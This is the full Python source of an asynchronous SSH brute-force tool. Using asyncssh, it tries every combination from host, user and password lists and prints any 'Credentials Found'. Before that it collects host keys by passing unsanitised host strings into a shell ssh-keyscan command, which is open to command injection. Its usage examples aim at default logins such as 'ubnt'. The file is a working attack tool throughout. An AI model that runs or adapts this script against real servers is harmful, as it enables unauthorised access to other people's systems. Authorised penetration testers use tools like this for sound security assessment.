import subprocess
import itertools
import asyncssh
import asyncio
import logging

from sys import argv
from pathlib import Path

log = logging.basicConfig(format='ssh_auth 🠖 %(message)s', level=logging.WARNING)


class SShutTFU:
    def __init__(self, host_file, user_file, pass_file, workers, known_hosts):
        self.host_file = self._return_list(host_file)
        self.user_file = self._return_list(user_file)
        self.pass_file = self._return_list(pass_file)
        self.workers = int(workers)
        self.known_hosts = known_hosts
        self.ignore_hosts = []
        self.async_timeout = 5

    @staticmethod
    def _return_list(item):
        """Return lines in file as list, or return single list item"""
        stub = []
        config = Path(item)
        if config.is_file():
            for x in open(item):
                stub.append(x.rstrip())
            return stub
        else:
            stub.append(str(item).rstrip())
            return stub

    async def get_keys(self, host_queue):
        """Asynchronous Process - Retrieve the SSH keys from hosts"""
        while host_queue.empty() is not True:
            host = await host_queue.get()
            port = 22
            if ':' in host:
                host,  port = host.split(':')
            command = "ssh-keyscan -t rsa,dsa,ecdsa,ed25519 -p"
            proc = subprocess.check_call(f"{command} {port} {str(host)} >> {self.known_hosts} 2>/dev/null", shell=True)
            if proc == 0:
                print(f" 🠖 Key Added for Host: {host}")
            elif proc == 1:
                print(f"[ERROR] Key for Host: {host} failed to add.  Sending to ignore list.")
                if host not in self.ignore_hosts:
                    self.ignore_hosts.append(host)
            host_queue.task_done()

    async def worker(self, queue):
        """Asynchronous Process - Queue Worker"""
        while queue.empty() is not True:
            h, u, p = await queue.get()
            timeout_retry = 0
            k = self.known_hosts
            if h in self.ignore_hosts:
                continue
            while True:
                try:
                    t = 22
                    if ':' in h:
                        h, t = h.split(':')
                    if timeout_retry == 0:
                        print(f"Attempting {u} {p} on host {h}                                              \r", end='')
                    else:
                        print(f"Retry {timeout_retry} Attempting {u} {p} on host {h}                        \r", end='')
                    await asyncio.wait_for(asyncssh.connect(
                        h,
                        username=u,
                        port=t,
                        password=p,
                        known_hosts=k), timeout=self.async_timeout)
                    print(f" 🠖 Credentials Found: {h} - User:{u} Pass:{p}                                            ")
                except asyncssh.PermissionDenied:
                    pass
                except asyncssh.HostKeyNotVerifiable:
                    k = None
                    continue
                except (TimeoutError, asyncio.TimeoutError):
                    timeout_retry += 1
                    if timeout_retry >= 3:
                        break
                    continue
                except asyncssh.misc.ProtocolError:
                    break
                finally:
                    queue.task_done()
                break
        return

    async def main(self):
        """Asynchronous Process - Main Function"""
        host_queue = asyncio.Queue()

        for h in itertools.product(self.host_file):
            if h:
                host_queue.put_nowait(''.join(h))
        key_tasks = []
        print(f"\n[ Gathering SSH Keys to Store in '{self.known_hosts}' ]")
        for i in range(self.workers):
            key_task = asyncio.create_task(self.get_keys(host_queue))
            key_tasks.append(key_task)
        await host_queue.join()
        for key_task in key_tasks:
            key_task.cancel()

        queue = asyncio.Queue()

        for h, u, p in itertools.product(self.host_file, self.user_file, self.pass_file):
            queue.put_nowait((h, u, p))
        tasks = []
        print(f"\n[ Running the Asynchronous processes... ]")
        for i in range(self.workers):
            task = asyncio.create_task(self.worker(queue))
            tasks.append(task)
        await queue.join()
        for task in tasks:
            task.cancel()


def usage():
    u = f"""
    USAGE:
      {argv[0]} -h "192.168.1.2" -u "ubnt" -p /tmp/passwords.txt
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20 
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20 -k /tmp/known_hosts

    OPTIONS:
      '-h', '--hosts'        - Set the hostname or path to file containing host or host:port.
      '-u', '--users'        - Set the username or path to file containing users.
      '-p', '--passwords'    - Set the password or path to file containing passwords.
      '-w', '--workers'      - Set the number of workers to run during attempts.
      '-k', '--known_hosts'  - Set the full path location to your ~/.ssh/known_hosts 

    """
    print(u)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--hosts', action='store', dest='hosts', default='')
    parser.add_argument('-u', '--users', action='store', dest='users', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
    parser.add_argument('-k', '--known_hosts', action='store', dest='known_hosts', default='')
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit("Invalid options provided. Exiting.")

    if not arg.hosts or not arg.users or not arg.passwords:
        usage()
        exit("Required options not provided. Exiting.")

    if not arg.workers:
        arg.workers = 10

    if not arg.known_hosts:
        arg.known_hosts = "/tmp/known_hosts"

    pwner = SShutTFU(arg.hosts, arg.users, arg.passwords, arg.workers, arg.known_hosts)
    asyncio.run(pwner.main())
